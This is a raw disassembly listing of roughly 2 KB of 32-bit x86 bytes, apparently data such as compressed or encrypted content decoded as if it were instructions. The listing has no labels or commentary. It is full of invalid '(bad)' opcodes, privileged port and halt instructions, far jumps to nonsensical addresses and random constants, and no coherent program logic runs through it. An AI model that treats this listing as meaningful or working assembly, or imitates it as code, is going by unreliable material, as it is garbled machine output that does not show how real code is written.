  41cfd2:	dec    esi
  41cfd3:	jno    0x41cfe9
  41cfd5:	cmp    BYTE PTR [ebp+0x27],0x45
  41cfd9:	sub    DWORD PTR [ebp+0x43],eax
  41cfdc:	lods   al,BYTE PTR ds:[esi]
  41cfdd:	and    BYTE PTR [ecx],bl
  41cfdf:	test   DWORD PTR [ecx+0x2dc909bf],ecx
  41cfe5:	mov    bl,0xf3
  41cfe7:	push   0xffffffa7
  41cfe9:	adc    bh,BYTE PTR [esi]
  41cfeb:	and    eax,0x63751161
  41cff0:	fst    QWORD PTR [edx-0x17967de9]
  41cff6:	push   cs
  41cff7:	jae    0x41cf91
  41cff9:	das    
  41cffa:	cwde   
  41cffb:	mov    ds:0x4a916a54,eax
  41d000:	lods   al,BYTE PTR ds:[esi]
  41d001:	push   cs
  41d002:	aas    
  41d003:	fist   DWORD PTR [esi+0xf697c98]
  41d009:	add    DWORD PTR [eax],ebp
  41d00b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d00c:	lock mov al,ds:0xe42b72f5
  41d012:	fcomp  DWORD PTR [ebx]
  41d014:	hlt    
  41d015:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d016:	scas   al,BYTE PTR es:[edi]
  41d017:	mov    ecx,0x84bbea70
  41d01c:	stc    
  41d01d:	fadd   DWORD PTR [edi]
  41d01f:	mov    edx,0xa5e8552
  41d024:	fcmovb st,st(0)
  41d026:	cmp    BYTE PTR [esi],0x96
  41d029:	pusha  
  41d02a:	stos   DWORD PTR es:[edi],eax
  41d02b:	(bad)
  41d02e:	fiadd  WORD PTR [eax-0x26dc49ad]
  41d034:	fcomip st,st(6)
  41d036:	fwait
  41d037:	imul   ecx,ebp,0x1e119def
  41d03d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d03e:	rcr    DWORD PTR [edi],0x8
  41d041:	repnz xor bh,BYTE PTR [bp+di-0xdf5]
  41d047:	iret   
  41d048:	mov    bl,0xb9
  41d04a:	loope  0x41d074
  41d04c:	jle    0x41cfea
  41d04e:	outs   dx,BYTE PTR ds:[esi]
  41d050:	(bad)  
  41d051:	pushf  
  41d052:	nop
  41d053:	adc    dl,BYTE PTR [ebx+0x35f24b63]
  41d059:	sar    BYTE PTR [edi],0x7b
  41d05c:	pop    es
  41d05d:	ins    BYTE PTR es:[edi],dx
  41d05e:	or     al,0x3b
  41d060:	(bad)  
  41d061:	xchg   ebp,ebp
  41d063:	les    ebx,FWORD PTR [eax+0x3ad726dc]
  41d069:	xchg   BYTE PTR [edi+0x1ec257],bh
	...
  41d0d3:	add    BYTE PTR [eax],al
  41d0d5:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41d0db:	push   edi
  41d0dc:	sti    
  41d0dd:	dec    BYTE PTR [esi-0x1b]
  41d0e0:	mov    ebp,0x6abb02bd
  41d0e5:	cmp    eax,0x13867
  41d0ea:	add    BYTE PTR [ecx],al
  41d0ec:	add    BYTE PTR [eax],al
  41d0ee:	inc    BYTE PTR [edi-0x19d8974]
  41d0f4:	(bad)  
  41d0f6:	adc    al,0xcd
  41d0f8:	mov    WORD PTR [esi-0x53e38302],ss
  41d0fe:	out    0x5c,eax
  41d100:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d101:	je     0x41d14c
  41d103:	(bad)  
  41d104:	jmp    0xc3969d4d
  41d109:	adc    ah,BYTE PTR [eax-0x5b6b4675]
  41d10f:	stc    
  41d110:	mov    edi,0xd7e5aac5
  41d115:	dec    ebx
  41d116:	xor    BYTE PTR [ecx+esi*2+0x33750b7],0x0
  41d11e:	push   ecx
  41d11f:	push   ebx
  41d120:	xchg   esp,eax
  41d121:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d122:	pop    ebx
  41d123:	mov    ch,0xec
  41d125:	(bad)  
  41d127:	jo     0x41d126
  41d129:	mov    dh,0x43
  41d12b:	jge    0x41d163
  41d12d:	inc    eax
  41d12e:	ds or  al,0x18
  41d131:	aaa    
  41d132:	aad    0x3b
  41d134:	jmp    0x41d19c
  41d136:	xchg   esp,eax
  41d137:	repz inc eax
  41d139:	jb     0x41d11a
  41d13b:	xlat   BYTE PTR ds:[ebx]
  41d13c:	retf   
  41d13d:	lock sub al,0xe4
  41d140:	push   0xd1bf2c98
  41d145:	mov    al,ah
  41d147:	mov    esp,esi
  41d149:	push   ss
  41d14a:	pushf  
  41d14b:	sbb    ch,ah
  41d14d:	cs push ebx
  41d14f:	inc    edi
  41d150:	scas   al,BYTE PTR es:[edi]
  41d151:	mov    dl,0xf7
  41d153:	test   eax,0x55d39582
  41d158:	lock sub edx,ebp
  41d15b:	icebp  
  41d15c:	lea    ebp,[ebx+0x54]
  41d15f:	pop    ecx
  41d160:	mov    ch,0xd1
  41d162:	sbb    dh,BYTE PTR [ebp-0x83ea59c]
  41d168:	jbe    0x41d11e
  41d16a:	dec    edx
  41d16b:	push   ecx
  41d16c:	adc    BYTE PTR [ebx+0x7dddfba8],0x8b
  41d173:	fcmovnbe st,st(1)
  41d175:	(bad)  
  41d177:	inc    ebx
  41d178:	mov    esi,0xd42edb8e
  41d17d:	out    dx,al
  41d17e:	jmp    0x7da99009
  41d183:	xchg   BYTE PTR [edx-0x52],cl
  41d186:	xor    cl,ch
  41d188:	mov    ds:0x3e26df61,al
  41d18d:	fnstcw WORD PTR ds:0x1669813
  41d193:	pop    ds
  41d194:	or     cl,BYTE PTR [esi-0x36a391fa]
  41d19a:	pop    edi
  41d19b:	push   esi
  41d19c:	std    
  41d19d:	sub    DWORD PTR [ebp-0x6c7d3b8e],ebp
  41d1a3:	sar    BYTE PTR [ebx],cl
  41d1a5:	les    esp,FWORD PTR [ecx-0x12]
  41d1a8:	js     0x41d18c
  41d1aa:	outs   dx,DWORD PTR ds:[esi]
  41d1ab:	pop    eax
  41d1ac:	out    0x90,eax
  41d1ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1af:	sbb    dh,BYTE PTR [ebx-0x7aa05de3]
  41d1b5:	loope  0x41d1bc
  41d1b7:	pop    edi
  41d1b8:	nop
  41d1b9:	fwait
  41d1ba:	lahf   
  41d1bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1bc:	xchg   esi,eax
  41d1bd:	mov    bh,0x4a
  41d1bf:	sahf   
  41d1c0:	push   ecx
  41d1c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1c2:	mov    al,0x65
  41d1c4:	inc    ebp
  41d1c5:	scas   al,BYTE PTR es:[edi]
  41d1c6:	jecxz  0x41d208
  41d1c8:	jle    0x41d1ac
  41d1ca:	mov    ebp,0x36d16b0
  41d1cf:	sbb    al,0x7b
  41d1d1:	inc    BYTE PTR [esi+0x4]
  41d1d4:	jmp    FWORD PTR [edx]
  41d1d6:	cmp    al,0x1b
  41d1d8:	xlat   BYTE PTR ds:[ebx]
  41d1d9:	mov    ds:0x70aa2513,eax
  41d1df:	idiv   DWORD PTR [ecx+eax*2+0x689692fb]
  41d1e6:	(bad)  [eax]
  41d1e8:	pop    ecx
  41d1e9:	in     al,0x63
  41d1eb:	pop    esi
  41d1ec:	scas   al,BYTE PTR es:[edi]
  41d1ed:	je     0x41d1ef
	...
  41d253:	add    BYTE PTR [eax],al
  41d255:	add    BYTE PTR [eax-0x3d],dl
  41d258:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d25e:	xor    DWORD PTR [ebp-0x7],esp
  41d261:	hlt    
  41d262:	jae    0x41d2a7
  41d264:	clc    
  41d265:	out    dx,eax
  41d266:	cmp    DWORD PTR [bx+di],eax
  41d269:	add    BYTE PTR [eax],al
  41d26b:	add    DWORD PTR [eax],eax
  41d26d:	add    ah,ch
  41d26f:	hlt    
  41d270:	test   BYTE PTR [ecx+0x5a],dl
  41d273:	push   esp
  41d274:	xchg   ecx,eax
  41d275:	jb     0x41d21b
  41d277:	mov    ebx,0x705d9b89
  41d27c:	xor    al,0x1
  41d27e:	pushf  
  41d27f:	cmp    DWORD PTR [edx-0x3c],edi
  41d282:	and    ebp,DWORD PTR [ebx+0x3d04e09a]
  41d288:	scas   eax,DWORD PTR es:[edi]
  41d289:	fstp   DWORD PTR ds:0x9191a0fd
  41d28f:	lods   al,BYTE PTR ds:[esi]
  41d290:	ds out 0xa,eax
  41d293:	sbb    eax,0xe86c3835
  41d298:	sub    bl,BYTE PTR [ebx+0x5e]
  41d29b:	cld    
  41d29c:	xor    eax,DWORD PTR [esi]
  41d29e:	clc    
  41d29f:	jmp    0x1bea:0xd2c0aeaf
  41d2a6:	jo     0x41d2a4
  41d2a8:	jecxz  0x41d321
  41d2aa:	fsub   DWORD PTR [esi+0x2b5b1cf0]
  41d2b0:	mov    dh,dh
  41d2b2:	sbb    edi,DWORD PTR [ecx+0x71211612]
  41d2b8:	mov    ebx,DWORD PTR [edx]
  41d2ba:	pop    ebp
  41d2bb:	push   ebx
  41d2bc:	aaa    
  41d2bd:	cmp    DWORD PTR [esi],ebx
  41d2bf:	mov    dl,0x45
  41d2c1:	xor    DWORD PTR ds:0xbd68f2c5,esp
  41d2c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2c8:	dec    eax
  41d2c9:	jmp    0xc335:0x9f7579
  41d2d0:	jmp    0x3ce7:0x29f6090a
  41d2d7:	fisub  WORD PTR [edi+0x1a]
  41d2da:	jl     0x41d2d7
  41d2dc:	pop    eax
  41d2dd:	inc    esi
  41d2de:	cwde   
  41d2df:	pop    esi
  41d2e0:	and    edx,edx
  41d2e2:	xchg   esi,eax
  41d2e3:	ss push ds
  41d2e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2e6:	int3   
  41d2e7:	sbb    ecx,ebp
  41d2e9:	add    dh,cl
  41d2eb:	xchg   esp,eax
  41d2ec:	out    dx,al
  41d2ed:	xchg   BYTE PTR [ecx+0xe8f6f93],bh
  41d2f3:	shl    BYTE PTR [edi],1
  41d2f5:	or     edx,ecx
  41d2f7:	push   ecx
  41d2f8:	mul    bh
  41d2fa:	xchg   ah,al
  41d2fc:	loop   0x41d323
  41d2fe:	inc    eax
  41d2ff:	int    0x8c
  41d301:	js     0x41d364
  41d303:	fsubr  DWORD PTR [edx+0x47f97690]
  41d309:	int    0x6a
  41d30b:	out    0xbc,eax
  41d30d:	ins    DWORD PTR es:[edi],dx
  41d30e:	pop    ecx
  41d30f:	gs pop ebx
  41d311:	popa   
  41d312:	imul   esp,DWORD PTR gs:[esi+esi*8-0x48],0xca444966
  41d31b:	cld    
  41d31c:	into   
  41d31d:	inc    esi
  41d31e:	sar    DWORD PTR [edx+0x29],0x8b
  41d322:	mov    ch,BYTE PTR [esi-0xbc76ee3]
  41d328:	push   ss
  41d329:	inc    ebp
  41d32a:	xor    dh,al
  41d32c:	push   esi
  41d32d:	js     0x41d306
  41d32f:	inc    eax
  41d330:	push   esp
  41d331:	ins    BYTE PTR es:[edi],dx
  41d332:	std    
  41d333:	push   0x44daee65
  41d338:	js     0x373d96e0
  41d33e:	lods   eax,DWORD PTR ds:[esi]
  41d33f:	imul   ebp,DWORD PTR [ebx],0xffffffd5
  41d342:	mov    cl,0x1f
  41d344:	sub    BYTE PTR [edx+0x71],cl
  41d347:	add    bh,BYTE PTR [ecx+esi*1-0x59]
  41d34b:	(bad)  
  41d34c:	(bad)
  41d34f:	call   0x3ff7:0xccd45ddb
  41d356:	push   ebp
  41d357:	xor    eax,0x903b133
  41d35c:	repz mov ss,esi
  41d35f:	pop    es
  41d360:	in     al,0xd4
  41d362:	jmp    0x41d35d
  41d364:	jno    0x41d3bb
  41d366:	dec    ebp
  41d367:	xchg   edi,eax
  41d368:	std    
  41d369:	repnz sub DWORD PTR [edi],ebp
  41d36c:	cdq    
  41d36d:	arpl   WORD PTR [eax],ax
	...
  41d3d3:	add    BYTE PTR [eax],al
  41d3d5:	add    dh,bh
  41d3d7:	cmp    cl,0x54
  41d3da:	(bad)  
  41d3db:	jge    0x41d3dc
  41d3dd:	stos   BYTE PTR es:[edi],al
  41d3de:	lea    ebp,[edi]
  41d3e0:	shr    BYTE PTR [ecx-0x5c],0xe6
  41d3e4:	jns    0x41d405
  41d3e6:	cmp    al,BYTE PTR [bx+di]
  41d3e9:	add    BYTE PTR [eax],al
  41d3eb:	add    DWORD PTR [eax],eax
  41d3ed:	add    BYTE PTR [esi-0x6e],bl
  41d3f0:	push   es
  41d3f1:	lods   eax,DWORD PTR ds:[esi]
  41d3f2:	add    DWORD PTR [ecx+0x7d],0xef72d911
  41d3f9:	cmp    al,0x8e
  41d3fb:	pop    ss
  41d3fc:	fsubr  DWORD PTR [ebp+0x0]
  41d3ff:	in     al,0x69
  41d401:	rcr    DWORD PTR [esi],0x18
  41d404:	clc    
  41d405:	push   ds
  41d406:	mov    BYTE PTR [edi+0x2d32406],ah
  41d40c:	(bad)  
  41d40d:	stos   BYTE PTR es:[edi],al
  41d40e:	xchg   ecx,eax
  41d40f:	aas    
  41d410:	inc    edi
  41d411:	jb     0x41d3b6
  41d413:	adc    BYTE PTR [esi],al
  41d415:	idiv   BYTE PTR [esi+ebp*2]
  41d418:	add    DWORD PTR [edi+ebx*1-0x38db49d2],0x9bd0bdab
  41d423:	mov    edi,0x77c1cd8d
  41d428:	scas   eax,DWORD PTR es:[edi]
  41d429:	imul   ebp,DWORD PTR [edi+eiz*4],0xffffffd3
  41d42d:	int3   
  41d42e:	mov    bl,0x24
  41d430:	add    ch,BYTE PTR [ebx-0x25]
  41d433:	cli    
  41d434:	scas   al,BYTE PTR es:[edi]
  41d435:	pop    ecx
  41d436:	cmp    DWORD PTR ds:0xf75aaf97,esp
  41d43c:	pop    ds
  41d43d:	(bad)  
  41d43e:	test   al,0xec
  41d440:	mov    ebp,0xfe2f0fcc
  41d445:	leave  
  41d446:	sbb    BYTE PTR [ebp+0x152c27b8],bl
  41d44c:	xor    dh,al
  41d44e:	cmp    edi,esp
  41d450:	lea    esp,[ecx]
  41d452:	in     al,dx
  41d453:	neg    DWORD PTR [eax]
  41d455:	ins    BYTE PTR es:[edi],dx
  41d456:	xchg   esi,eax
  41d457:	mov    bh,0x22
  41d459:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d45a:	or     BYTE PTR [ebp-0x737c05ac],al
  41d460:	pop    esp
  41d461:	add    al,0x23
  41d463:	jae    0x41d4a9
  41d465:	and    al,0x5b
  41d467:	add    BYTE PTR [edi],0x23
  41d46a:	sbb    BYTE PTR [ebx*4+0x7f92897e],dl
  41d471:	pop    edi
  41d472:	test   BYTE PTR [ecx],bh
  41d474:	xor    BYTE PTR [ebx+0x4],al
  41d477:	das    
  41d478:	fwait
  41d479:	xchg   esi,eax
  41d47a:	ja     0x41d431
  41d47c:	ret    0x48e4
  41d47f:	mov    ecx,0x41fc36c
  41d484:	fld    DWORD PTR [edi]
  41d486:	jae    0x41d4b1
  41d488:	sub    bh,cl
  41d48a:	cmp    al,0xce
  41d48c:	xchg   ebx,eax
  41d48d:	jbe    0x41d433
  41d48f:	scas   al,BYTE PTR es:[edi]
  41d490:	test   BYTE PTR [eax+0x4],ah
  41d493:	loop   0x41d4cb
  41d495:	stos   BYTE PTR es:[edi],al
  41d496:	cmp    al,0x4f
  41d498:	popf   
  41d499:	mov    WORD PTR [edx-0x5ee6f46c],es
  41d49f:	sbb    ebp,DWORD PTR [ebp-0x59]
  41d4a2:	sub    eax,0x76531b1a
  41d4a7:	mov    cl,0x64
  41d4a9:	lahf   
  41d4aa:	call   0x589b:0xbdc4f8b0
  41d4b1:	mov    dl,0xc0
  41d4b3:	mov    esp,0xd34c2271
  41d4b8:	push   cs
  41d4b9:	push   0xffffffcf
  41d4bb:	popf   
  41d4bc:	push   edx
  41d4bd:	sub    BYTE PTR [eax],cl
  41d4bf:	mov    ch,0x69
  41d4c1:	mov    ebp,0x39e8c5f3
  41d4c6:	lahf   
  41d4c7:	dec    eax
  41d4c8:	or     DWORD PTR [esi+0x2a],ecx
  41d4cb:	mov    WORD PTR [edx+0x2181374f],gs
  41d4d1:	or     al,0x2b
  41d4d3:	push   eax
  41d4d4:	leave  
  41d4d5:	push   eax
  41d4d6:	sub    dh,BYTE PTR fs:[eax+0x19]
  41d4da:	scas   al,BYTE PTR es:[edi]
  41d4db:	test   BYTE PTR [esp+ecx*1-0x2ce05a5f],0xd7
  41d4e3:	cs stos BYTE PTR es:[edi],al
  41d4e5:	les    esp,FWORD PTR [edx-0x1d25afb6]
  41d4eb:	cli    
  41d4ec:	ret    
  41d4ed:	mov    DWORD PTR [eax],0x0
	...
  41d553:	add    BYTE PTR [eax],al
  41d555:	add    dh,dh
  41d557:	rcl    BYTE PTR ss:[edx+edx*8+0x7d76f6f4],cl
  41d55f:	nop
  41d560:	call   0x6739:0xe5ca5389
  41d567:	cmp    eax,DWORD PTR [ecx]
  41d569:	add    BYTE PTR [eax],al
  41d56b:	add    DWORD PTR [eax],eax
  41d56d:	add    BYTE PTR [ecx-0xe],ah
  41d570:	je     0x41d5cb
  41d572:	int    0xd2
  41d574:	(bad)  
  41d575:	in     eax,dx
  41d576:	xor    cl,BYTE PTR [edi+0x1ec32642]
  41d57c:	arpl   WORD PTR [ecx],sp
  41d57e:	push   esp
  41d57f:	dec    eax
  41d580:	mov    eax,0xce770662
  41d585:	in     al,dx
  41d586:	mov    eax,0x7c8b2bfe
  41d58b:	std    
  41d58c:	add    al,0xd5
  41d58e:	add    cl,bh
  41d590:	or     edi,esi
  41d592:	mov    BYTE PTR [edx+0x7a48ec56],dl
  41d598:	or     esp,DWORD PTR [edi-0x78133a0b]
  41d59e:	sar    BYTE PTR [edx-0x6a],1
  41d5a1:	retf   0x432f
  41d5a4:	xor    BYTE PTR ds:0xe04851ea,bh
  41d5aa:	lods   al,BYTE PTR ds:[esi]
  41d5ab:	sti    
  41d5ac:	js     0x41d588
  41d5ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5af:	pushf  
  41d5b0:	lods   al,BYTE PTR ds:[esi]
  41d5b1:	(bad)  
  41d5b2:	pusha  
  41d5b3:	and    DWORD PTR [esi],ecx
  41d5b5:	jmp    FWORD PTR [ecx]
  41d5b7:	test   eax,0xe11a3e18
  41d5bc:	jmp    0x41d626
  41d5be:	mov    es,WORD PTR [edi+0x3246cbc8]
  41d5c4:	test   ah,al
  41d5c6:	push   0xf48a5967
  41d5cb:	ja     0x41d632
  41d5cd:	mov    WORD PTR [ebp-0x67],ss
  41d5d0:	test   al,0xc1
  41d5d2:	sbb    BYTE PTR [esi+eiz*2-0x7b7f94ae],ah
  41d5d9:	xor    al,0x35
  41d5db:	in     al,0xd8
  41d5dd:	jmp    0xab6146d3
  41d5e2:	sbb    DWORD PTR [ebx+eax*2],ebx
  41d5e5:	push   ds
  41d5e6:	mov    cl,0xa5
  41d5e8:	pop    edi
  41d5e9:	(bad)  
  41d5eb:	ret    
  41d5ec:	dec    ebp
  41d5ed:	jae    0x41d65e
  41d5ef:	imul   esp,DWORD PTR [edi],0xd520a650
  41d5f5:	mov    esp,0x650a66a6
  41d5fa:	or     edx,DWORD PTR [eax]
  41d5fc:	push   esp
  41d5fd:	adc    ch,BYTE PTR [ebp+0x40e3fe2f]
  41d603:	jg     0x41d655
  41d605:	(bad)  
  41d607:	icebp  
  41d608:	pop    ecx
  41d609:	sub    ah,BYTE PTR [ecx+0xc]
  41d60c:	pushf  
  41d60d:	scas   al,BYTE PTR es:[edi]
  41d60e:	pop    ecx
  41d60f:	daa    
  41d610:	outs   dx,DWORD PTR ds:[esi]
  41d611:	ror    DWORD PTR [ebp+0xd0e98bf],cl
  41d617:	and    edx,DWORD PTR [esi]
  41d619:	imul   ebx,DWORD PTR [ecx-0x66],0x50
  41d61d:	xlat   BYTE PTR ds:[ebx]
  41d61e:	mov    esi,0x3c3167ba
  41d623:	dec    esi
  41d624:	cmp    dh,BYTE PTR [ebp+0x7d33ff0d]
  41d62a:	ror    DWORD PTR [edi-0x74],1
  41d62d:	xor    DWORD PTR [eax+0x76635c5f],0x2e
  41d634:	mov    edx,0xc0a5a4a7
  41d639:	pop    ss
  41d63a:	dec    esp
  41d63b:	pop    edi
  41d63c:	repnz cmc 
  41d63e:	mov    dl,0xe4
  41d640:	jecxz  0x41d691
  41d642:	aaa    
  41d643:	fistp  WORD PTR [ebp-0xd536bb3]
  41d649:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41d64b:	cdq    
  41d64c:	rcl    eax,1
  41d64e:	imul   ebp,ecx,0xfffffffb
  41d651:	stc    
  41d652:	sbb    eax,0x9465e8e7
  41d657:	jae    0x41d684
  41d659:	outs   dx,BYTE PTR ds:[esi]
  41d65a:	inc    esp
  41d65b:	dec    ebp
  41d65c:	leave  
  41d65d:	fbstp  TBYTE PTR [edi+0x77]
  41d660:	push   ebp
  41d661:	add    DWORD PTR [ebp+0x26],edi
  41d664:	retf   
  41d665:	fsubr  st(3),st
  41d667:	mov    ebp,0x563249b1
  41d66c:	retf   
  41d66d:	mov    BYTE PTR [eax],al
	...
  41d6d3:	add    BYTE PTR [eax],al
  41d6d5:	add    BYTE PTR [ecx+ebx*4+0x4c],bh
  41d6d9:	jbe    0x41d6c8
  41d6db:	idiv   DWORD PTR [esi-0x65]
  41d6de:	or     eax,0xe166e435
  41d6e3:	repnz shr BYTE PTR ds:0x13c67,0x0
  41d6eb:	add    DWORD PTR [eax],eax
  41d6ed:	add    ah,bl
  41d6ef:	xchg   ebp,eax
  41d6f0:	retf   
  41d6f1:	scas   eax,DWORD PTR es:[edi]
  41d6f2:	pop    ss
  41d6f3:	sub    al,0x9f
  41d6f5:	imul   esp,DWORD PTR [ecx-0xdbcd682],0x16c534b6
  41d6ff:	dec    ecx
  41d700:	jecxz  0x41d71f
  41d702:	(bad)  
  41d703:	pop    esp
  41d704:	out    0x83,eax
  41d706:	mul    DWORD PTR gs:[edi]
  41d709:	or     dh,BYTE PTR [ecx-0x34]
  41d70c:	imul   ebp,DWORD PTR [ebp-0x16f74e41],0x5c
  41d713:	dec    ebx
  41d714:	sti    
  41d715:	mov    BYTE PTR [ebx+0x5c],dh
  41d718:	xchg   edi,eax
  41d719:	pop    ss
  41d71a:	add    al,0x15
  41d71c:	(bad)  [esi-0x31feb6e]
  41d722:	sub    eax,0x9739825f
  41d727:	cmp    DWORD PTR [edx-0x74fd7e7b],ebx
  41d72d:	inc    esp
  41d72e:	es or  eax,0xfe3ee870
  41d734:	mov    bl,BYTE PTR [ecx-0x72598ade]
  41d73a:	out    0x90,al
  41d73c:	fs jp  0x41d6ca
  41d73f:	mov    esi,0x373be61e
  41d744:	loope  0x41d709
  41d746:	fstp   DWORD PTR [ecx-0x35117d9]
  41d74c:	xlat   BYTE PTR ds:[ebx]
  41d74d:	dec    edi
  41d74e:	stos   DWORD PTR es:[edi],eax
  41d74f:	adc    ebx,DWORD PTR [eax]
  41d751:	xchg   ebp,eax
  41d752:	out    0x2,al
  41d754:	imul   esi,DWORD PTR [eax+ebx*4],0xc2478ba7
  41d75b:	sub    ch,BYTE PTR [edx+0x1d]
  41d75e:	pop    ebp
  41d75f:	je     0x41d76f
  41d761:	or     BYTE PTR ds:0xf56ba7d3,dh
  41d767:	mov    eax,0x442ec8b8
  41d76c:	pop    ecx
  41d76d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d76e:	pop    ds
  41d76f:	scas   eax,DWORD PTR es:[edi]
  41d770:	sbb    eax,0xead98bad
  41d775:	push   esi
  41d776:	clc    
  41d777:	lds    edi,FWORD PTR [ecx-0x10]
  41d77a:	jecxz  0x41d7f3
  41d77c:	adc    dl,dl
  41d77e:	sbb    edx,esp
  41d780:	push   ebx
  41d781:	push   edi
  41d782:	and    DWORD PTR [ebx],ecx
  41d784:	lods   eax,DWORD PTR ds:[esi]
  41d785:	xchg   esp,eax
  41d786:	push   ds
  41d787:	mov    eax,DWORD PTR [esi-0x614b41a0]
  41d78d:	jne    0x41d77b
  41d78f:	sbb    DWORD PTR [ecx+0xc3295f9],ecx
  41d795:	cmp    edi,DWORD PTR [edx+esi*4+0x68]
  41d799:	scas   al,BYTE PTR es:[edi]
  41d79a:	retf   0xd92c
  41d79d:	jle    0x41d741
  41d79f:	cmp    edi,DWORD PTR [ebx+0x314356cd]
  41d7a5:	outs   dx,DWORD PTR ds:[esi]
  41d7a6:	sub    ah,BYTE PTR [esi+0x6d2a403f]
  41d7ac:	xor    eax,0x9acd018d
  41d7b1:	enter  0xd100,0x88
  41d7b5:	inc    eax
  41d7b6:	mov    ds:0xf38c826,eax
  41d7bb:	dec    eax
  41d7bc:	xor    eax,DWORD PTR [edi+0x57]
  41d7bf:	outs   dx,DWORD PTR ds:[esi]
  41d7c0:	sub    ecx,0x33e3332
  41d7c6:	add    BYTE PTR [edx-0x13c36f5c],ah
  41d7cc:	out    dx,al
  41d7cd:	push   0xaabb713f
  41d7d2:	pushf  
  41d7d3:	pop    ecx
  41d7d4:	and    DWORD PTR [edi],ebp
  41d7d6:	loop   0x41d841
  41d7d8:	lock mov al,0x7
  41d7db:	sti    
  41d7dc:	ret    0x7755
  41d7df:	test   eax,0xb42ed2be
  41d7e4:	xor    bh,bl
  41d7e6:	ret    0x2990
  41d7e9:	loop   0x41d7f6
  41d7eb:	loope  0x41d7c3
  41d7ed:	cld    
	...
  41d856:	and    al,0xce
  41d858:	outs   dx,BYTE PTR ds:[esi]
  41d859:	sub    ch,dh
  41d85b:	stos   BYTE PTR es:[edi],al
  41d85c:	fs into 
  41d85e:	jmp    0x41d7eb
  41d860:	leave  
  41d861:	aas    
  41d862:	inc    ecx
  41d863:	in     eax,dx
  41d864:	dec    esp
  41d865:	mov    al,0x67
  41d867:	cmp    eax,0x1000001
  41d86c:	add    BYTE PTR [eax],al
  41d86e:	and    al,0xaa
  41d870:	(bad)  
  41d871:	mov    eax,0x8d5eef09
  41d876:	outs   dx,DWORD PTR ds:[esi]
  41d877:	imul   ebx,DWORD PTR [eax],0xaa90cb87
  41d87d:	sbb    al,0x8a
  41d87f:	daa    
  41d880:	pop    edx
  41d881:	imul   ecx,eax,0x87167ca2
  41d887:	popa   
  41d888:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d889:	mov    dl,0xf5
  41d88b:	(bad)
  41d88e:	je     0x41d819
  41d890:	mov    al,0xc7
  41d892:	aaa    
  41d893:	retf   0x205f
  41d896:	cmp    BYTE PTR [ebx+eiz*8+0x2e],cl
  41d89a:	and    dl,BYTE PTR [ecx+0x15370c6d]
  41d8a0:	push   ecx
  41d8a1:	push   ss
  41d8a2:	mov    ebp,DWORD PTR [edi-0x1e6471b4]
  41d8a8:	lods   eax,DWORD PTR ds:[esi]
  41d8a9:	mov    edx,0x9b44b635
  41d8ae:	xor    al,0x20
  41d8b0:	xchg   esp,eax
  41d8b1:	sbb    DWORD PTR [ecx+ecx*4],ecx
  41d8b4:	mov    esp,0x8d9087af
  41d8b9:	pop    ss
  41d8ba:	mov    bl,0x32
  41d8bc:	dec    ebp
  41d8bd:	cmp    DWORD PTR [eax+0x73],ebx
  41d8c0:	jns    0x41d912
  41d8c2:	shr    DWORD PTR [edi-0x37],0xfd
  41d8c6:	jg     0x41d930
  41d8c8:	xchg   ebp,eax
  41d8c9:	mov    ebx,0x33147e27
  41d8ce:	inc    esp
  41d8cf:	(bad)  
  41d8d1:	loop   0x41d8ae
  41d8d3:	and    ah,BYTE PTR [ecx]
  41d8d5:	nop
  41d8d6:	je     0x41d8a9
  41d8d8:	enter  0x42c3,0x4e
  41d8dc:	dec    edi
  41d8dd:	dec    esp
  41d8de:	mov    gs,WORD PTR [esi+0x46d85799]
  41d8e4:	int    0xea
  41d8e6:	push   cs
  41d8e7:	mul    esp
  41d8e9:	loop   0x41d893
  41d8eb:	and    eax,0x408ba8e7
  41d8f0:	add    bl,BYTE PTR ds:0x4d53da48
  41d8f6:	lods   al,BYTE PTR ds:[esi]
  41d8f7:	arpl   di,bp
  41d8f9:	xor    BYTE PTR [eax-0x21059e47],al
  41d8ff:	popa   
  41d900:	aas    
  41d901:	cmp    BYTE PTR [ecx-0x5058facb],0xef
  41d908:	xor    eax,0xd2a8350d
  41d90d:	jae    0x41d958
  41d90f:	mov    WORD PTR [esi+0x1e],ss
  41d912:	in     al,dx
  41d913:	add    eax,0x2f56f5c5
  41d918:	(bad)  
  41d919:	or     al,0x1e
  41d91b:	pop    ebp
  41d91c:	in     eax,dx
  41d91d:	daa    
  41d91e:	gs push edi
  41d920:	fcmovnb st,st(2)
  41d922:	fistp  DWORD PTR [edi-0x2c4a0cea]
  41d928:	mov    dh,0xd7
  41d92a:	and    bh,BYTE PTR [ebx-0x145ac59c]
  41d930:	cmp    cl,BYTE PTR [eax+0xd6ccf6a]
  41d936:	shl    BYTE PTR [edx],0xc2
  41d939:	repz add DWORD PTR [ebx+edi*8],edi
  41d93d:	inc    ebx
  41d93e:	dec    edx
  41d93f:	(bad)  
  41d940:	call   0x44f8206a
  41d945:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d946:	mov    al,0xd1
  41d948:	test   eax,0x31be7a73
  41d94d:	sbb    esi,eax
  41d94f:	adc    al,0xc8
  41d951:	or     BYTE PTR [ebx+0x75],dh
  41d954:	xchg   DWORD PTR [ebx-0x3b],ebp
  41d957:	and    al,0x30
  41d959:	inc    edi
  41d95a:	rcl    BYTE PTR gs:0xe60e6121,0x73
  41d962:	dec    eax
  41d963:	retf   
  41d964:	call   0xf480:0xb95c66b0
  41d96b:	or     ebp,DWORD PTR [ecx]
  41d96d:	mov    eax,DWORD PTR [eax]
	...
  41d9d3:	add    BYTE PTR [eax],al
